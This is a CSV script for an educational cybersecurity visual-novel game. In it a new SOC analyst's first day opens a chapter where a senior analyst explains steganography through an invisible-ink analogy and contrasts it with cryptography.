ID,Character,Type,Emotion,Content,Choices,Next,Points,Location,Background
9,System,TEXT,default,*Press the screen to start the game.*,,100,0,Title Screen,title
100,System,TEXT,default,[CHAPTER 1: THE INVISIBLE INK],,101,0,Lobby,chapter/1
101,Alex,TEXT,nervous,(Deep breath) Okay. First day at DataGuard Dynamics. Big league cybersecurity.,,102,0,Lobby,lobby
102,Receptionist,TEXT,happy,Good morning! You must be the new hire for the SOC team?,,103,0,Lobby,lobby
103,Alex,TEXT,happy,"Yes, I'm Alex. I'm reporting to Sarah.",,104,0,Lobby,lobby
104,Receptionist,TEXT,default,Here is your badge. You need to swipe it at the elevators. 4th Floor.,,105,0,Lobby,lobby
105,Receptionist,TEXT,happy,"Oh, and don't let Sarah scare you. She's tough but she's the best.",,106,0,Lobby,lobby
106,Alex,TEXT,nervous,Thanks... I'll try to remember that.,,107,0,Lobby,lobby
107,System,TEXT,default,[You walk to the elevators. A security guard watches you.],,108,0,Elevator Hall,ehall
108,Guard,TEXT,serious,Badge check.,,109,0,Elevator Hall,ehall
109,Alex,TEXT,default,Just got it.,,110,0,Elevator Hall,ehall
110,Guard,TEXT,default,"DataGuard SOC, huh? Good luck, kid. They handle the weird stuff up there.",,111,0,Elevator Hall,ehall
111,Alex,TEXT,thoughtful,Weird stuff... that sounds promising.,,112,0,Elevator Hall,ehall
112,System,TEXT,default,[You enter the elevator. The doors close.],,113,0,Elevator,elevator
113,Alex,TEXT,thoughtful,Okay. Don't ask stupid questions. Just listen. Learn the tools.,,114,0,Elevator,elevator
114,System,TEXT,default,[The doors open. The Security Operations Center is a dark room filled with glowing blue monitors.],,115,0,SOC Main Desk,socmain
115,Sarah,TEXT,default-mug,"...so I told IT that if they don't patch the server, I'm unplugging it myself. Oh, hello.",,116,0,SOC Main Desk,socmain
116,Alex,TEXT,happy,Hi! I'm Alex. The new Junior Analyst?,,117,0,SOC Main Desk,socmain
117,Sarah,TEXT,happy-mug,"Welcome aboard, Alex. I'm Sarah, Senior Analyst. You're right on time.",,118,0,SOC Main Desk,socmain
118,Sarah,TEXT,default-mug,Put your bag down. Do you drink coffee?,,119,0,SOC Main Desk,socmain
119,Alex,TEXT,default,Not really.,,120,0,SOC Main Desk,socmain
120,Sarah,TEXT,happy-mug,That's alright. We have a specific training module for you today.,,121,0,SOC Main Desk,socmain
121,Alex,TEXT,nervous,Is it about hacking? Firewalls? Passwords?,,122,0,SOC Main Desk,socmain
122,Sarah,TEXT,default-mug,Not exactly. Today we are talking about the art of hiding things in plain sight.,,123,0,SOC Main Desk,socmain
123,Sarah,TEXT,default-mug,It is called 'Steganography'. Ever heard of it?,,124,0,SOC Main Desk,socmain
124,Alex,TEXT,confused,Stega... what-now? That sounds like a dinosaur.,,125,0,SOC Main Desk,socmain
125,Sarah,TEXT,happy-mug,(Laughs) Steg-an-og-ra-phy. It's Greek. It basically means 'covered writing'.,,126,0,SOC Main Desk,socmain
126,Sarah,TEXT,default-mug,Let's start with a simple question to see where your head is at.,,127,0,SOC Main Desk,socmain
127,Sarah,QUESTION,default-mug,"Have you ever heard of 'Invisible Ink', like in old spy movies?","Yes, you write with lemon juice and heat it up to see the message -> 129; No, I only watch sci-fi -> 128",,0,SOC Main Desk,socmain
128,Sarah,TEXT,default-mug,"Well, in sci-fi, think of a cloaking device. But let's stick to the spy analogy.",,129,0,SOC Main Desk,socmain
129,Sarah,TEXT,default-mug,Steganography is basically digital invisible ink. It is often confused with Cryptography.,,130,0,SOC Main Desk,socmain
130,Alex,TEXT,default,I thought Cryptography was the secret code stuff?,,131,0,SOC Main Desk,socmain
131,Sarah,TEXT,default-mug,It is. Let me give you an analogy. Imagine you want to send a secret letter to a friend.,,132,0,SOC Main Desk,socmain
132,Sarah,TEXT,default-mug,"If you write the letter in a secret code that looks like 'XJ9-12-KL', that is Cryptography.",,133,0,SOC Main Desk,socmain
133,Sarah,TEXT,default-mug,"If a mailman sees it, he knows it's a secret, but he can't read it. He knows you are hiding something.",,134,0,SOC Main Desk,socmain
134,Sarah,TEXT,default-mug,"Now, imagine you write a normal boring letter about the weather, but you use invisible ink between the lines to write the secret.",,135,0,SOC Main Desk,socmain
135,Alex,TEXT,happy,Oh! So the mailman just thinks it's a boring letter about rain. He doesn't even know there is a secret.,,136,0,SOC Main Desk,socmain
